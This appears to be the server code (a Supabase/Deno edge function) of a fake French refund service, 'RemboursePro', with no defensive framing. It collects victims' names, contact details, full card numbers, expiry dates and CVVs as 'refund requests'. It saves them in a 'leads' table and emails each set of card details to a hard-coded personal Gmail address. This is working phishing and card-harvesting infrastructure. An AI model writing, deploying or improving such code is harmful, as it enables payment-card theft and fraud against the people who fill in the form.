import { serve } from 'https://deno.land/std@0.177.0/http/server.ts'
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

// ─── CORS ──────────────────────────────────────────────────────────────────────
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

// ─── Recipients ────────────────────────────────────────────────────────────────
const RECIPIENTS = ['raswise19@gmail.com']

// ─── Helpers ──────────────────────────────────────────────────────────────────
function json(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' },
  })
}

function sanitize(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}

function validateBody(body: Record<string, unknown>): string | null {
  const { name, message } = body
  if (!name || typeof name !== 'string' || !name.trim())
    return 'Le champ nom est requis.'
  if (!message || typeof message !== 'string' || !message.trim())
    return 'Les informations de carte sont requises.'
  return null
}

// ─── Parse card fields from message string ────────────────────────────────────
// message format: "Carte: **** **** **** 1234 | Exp: 03/2027 | CVV: ***"
function parseMessage(msg: string) {
  const carte = msg.match(/Carte:\s*([^\|]+)/)?.[1]?.trim() ?? '—'
  const exp   = msg.match(/Exp:\s*([^\|]+)/)?.[1]?.trim()   ?? '—'
  const cvv   = msg.match(/CVV:\s*([^\|]+)/)?.[1]?.trim()   ?? '—'
  return { carte, exp, cvv }
}

function buildEmailHtml(name: string, message: string): string {
  const date           = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })
  const { carte, exp, cvv } = parseMessage(message)

  const rows: [string, string][] = [
    ['Nom complet',  sanitize(name)],
    ['Numéro carte', sanitize(carte)],
    ['Expiration',   sanitize(exp)],
    ['CVV',          sanitize(cvv)],
    ['Date',         date],
  ]

  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <title>Nouvelle demande – RemboursePro</title>
</head>
<body style="margin:0;padding:0;background:#f1f5f9;font-family:Inter,system-ui,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="padding:32px 16px;">
    <tr>
      <td align="center">
        <table width="600" cellpadding="0" cellspacing="0"
          style="max-width:600px;width:100%;background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);">

          <!-- Header -->
          <tr>
            <td style="background:linear-gradient(135deg,#c2410c,#f97316);padding:28px 40px;text-align:center;">
              <h1 style="margin:0;color:#fff;font-size:20px;font-weight:800;letter-spacing:-0.5px;">
                RemboursePro
              </h1>
              <p style="margin:6px 0 0;color:#fed7aa;font-size:13px;">
                Nouvelle demande de remboursement reçue
              </p>
            </td>
          </tr>

          <!-- Body -->
          <tr>
            <td style="padding:32px 40px;">
              <p style="margin:0 0 20px;color:#475569;font-size:14px;line-height:1.6;">
                Une nouvelle demande a été soumise. Voici les informations :
              </p>

              <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;border-radius:10px;overflow:hidden;">
                ${rows.map(([label, value], i) => `
                <tr>
                  <td style="padding:11px 16px;background:${i % 2 === 0 ? '#f8fafc' : '#fff'};width:38%;vertical-align:top;">
                    <span style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#94a3b8;">
                      ${label}
                    </span>
                  </td>
                  <td style="padding:11px 16px;background:${i % 2 === 0 ? '#f8fafc' : '#fff'};vertical-align:top;">
                    <span style="font-size:14px;color:#1e293b;font-weight:500;">${value}</span>
                  </td>
                </tr>`).join('')}
              </table>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="padding:18px 40px;background:#f8fafc;border-top:1px solid #e2e8f0;text-align:center;">
              <p style="margin:0;font-size:11px;color:#94a3b8;">
                Email automatique – RemboursePro · Ne pas répondre directement.
              </p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`
}

// ─── Main handler ─────────────────────────────────────────────────────────────
serve(async (req: Request) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: CORS_HEADERS })
  }
  if (req.method !== 'POST') {
    return json({ error: 'Méthode non autorisée.' }, 405)
  }

  // Parse
  let body: Record<string, unknown>
  try {
    body = await req.json()
  } catch {
    return json({ error: 'Corps de requête invalide.' }, 400)
  }

  // Validate
  const validationError = validateBody(body)
  if (validationError) return json({ error: validationError }, 400)

  const name    = (body.name    as string).trim()
  const message = (body.message as string).trim()
  const phone   = typeof body.phone === 'string' ? body.phone.trim() : ''
  const email   = typeof body.email === 'string' ? body.email.trim() : ''

  // ── 1. Store in Supabase DB ────────────────────────────────────────────────
  const supabase = createClient(
    Deno.env.get('SUPABASE_URL') ?? '',
    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '',
    { auth: { persistSession: false } }
  )

  const { error: dbError } = await supabase
    .from('leads')
    .insert([{ name, email, phone, message }])

  if (dbError) {
    console.error('DB insert error:', dbError.message)
    return json({ error: 'Erreur lors de la sauvegarde du dossier.' }, 500)
  }

  // ── 2. Send email via Resend ───────────────────────────────────────────────
  const resendKey = Deno.env.get('RESEND_API_KEY')
  const fromEmail = Deno.env.get('FROM_EMAIL') ?? 'RemboursePro <onboarding@resend.dev>'

  if (!resendKey) {
    console.error('RESEND_API_KEY secret is not set')
    return json({ error: 'Configuration email manquante sur le serveur.' }, 500)
  }

  const resendRes = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      'Content-Type':  'application/json',
      'Authorization': `Bearer ${resendKey}`,
    },
    body: JSON.stringify({
      from:    fromEmail,
      to:      RECIPIENTS,
      subject: `Nouvelle demande – ${name}`,
      html:    buildEmailHtml(name, message),
    }),
  })

  if (!resendRes.ok) {
    const detail = await resendRes.text()
    console.error('Resend error:', detail)
    // Lead is already saved — don't fail the user request
  }

  return json({ success: true })
})
